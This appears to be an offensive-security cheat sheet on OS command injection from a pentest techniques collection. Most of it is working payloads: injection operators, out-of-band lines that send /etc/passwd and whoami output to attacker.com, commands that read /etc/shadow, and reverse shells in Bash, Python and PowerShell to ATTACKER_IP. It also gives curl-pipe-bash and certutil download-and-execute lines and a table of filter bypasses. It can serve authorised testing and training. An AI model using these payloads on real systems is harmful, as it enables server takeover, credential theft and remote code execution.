# Command Injection (OS Command Injection)

## Overview
Command injection occurs when user input is passed to a system shell command without proper sanitization. It allows an attacker to execute arbitrary operating system commands on the server, typically leading to full system compromise.

## When This Happens

- Applications that call system commands (ping, nslookup, file conversion, PDF generation, image processing).
- Parameters that include filenames, IP addresses, URLs, or hostnames processed by backend tools.
- Any feature that "runs something" on the server.

## Recon / Detection

### 1. Identify command-executing features
Look for features that likely invoke system commands:
- Network diagnostics (ping, traceroute, DNS lookup)
- File operations (conversion, compression, download)
- PDF/image generation
- Email sending (sendmail)
- System monitoring dashboards

### 2. Test for injection
**Concatenation operators:**
```
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id     (newline)
```

**Blind detection (time-based):**
```
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1 &
|| ping -c 5 127.0.0.1
```

**Blind detection (OOB):**
```
; curl http://attacker.com/$(whoami)
| nslookup $(whoami).attacker.com
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)
```

## Exploitation Steps

### 1. Confirm injection and identify OS
```
; id                    → Linux (uid=33(www-data)...)
; whoami                → Linux/Windows
& whoami                → Windows
| systeminfo            → Windows
```

### 2. Read sensitive files
```
; cat /etc/passwd
; cat /etc/shadow       → if root
; type C:\Windows\win.ini   → Windows
```

### 3. Establish reverse shell

**Bash:**
```
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Python:**
```
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PowerShell:**
```
| powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"
```

### 4. Download and execute payloads
```
; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
; curl http://attacker.com/shell.sh | bash
; certutil -urlcache -f http://attacker.com/payload.exe C:\temp\payload.exe    → Windows
```

## Filter Bypass Techniques

| Filter | Bypass |
|--------|--------|
| Spaces blocked | `{cat,/etc/passwd}`, `cat${IFS}/etc/passwd`, `cat$IFS/etc/passwd` |
| Keywords blocked | `w'h'o'a'm'i`, `w\h\o\a\m\i`, `who$@ami` |
| Semicolons blocked | `| id`, `|| id`, `` `id` ``, `$(id)`, `%0aid` |
| Slashes blocked | `${HOME:0:1}` = `/`, `${PATH:0:1}` = `/` |
| Backslash encoding | `\n` = newline, `\t` = tab |
| Wildcard bypass | `cat /etc/pas??d`, `cat /etc/pass*` |

## Tools

- **Commix**: Automated command injection detection and exploitation.
  ```bash
  commix -u "https://target.com/ping?ip=127.0.0.1" --os-shell
  ```
- **Burp Suite**: Manual injection testing in Repeater.
- **RevShells.com**: Reverse shell payload generator.

## Real-World Notes

- Command injection is often **critical severity** — it directly gives OS-level access.
- PHP `system()`, `exec()`, `passthru()`, `shell_exec()`, and backticks are common sinks.
- Python's `os.system()`, `subprocess.call(shell=True)` are vulnerable sinks.
- Node.js `child_process.exec()` is a vulnerable sink; `child_process.execFile()` is safer.
- Always try **newline injection** (`%0a`) — many filters miss it.

## References

- `techniques/server-side-template-injection.md`
- `techniques/sql-injection.md`
- `methodology/exploitation-methodology.md`
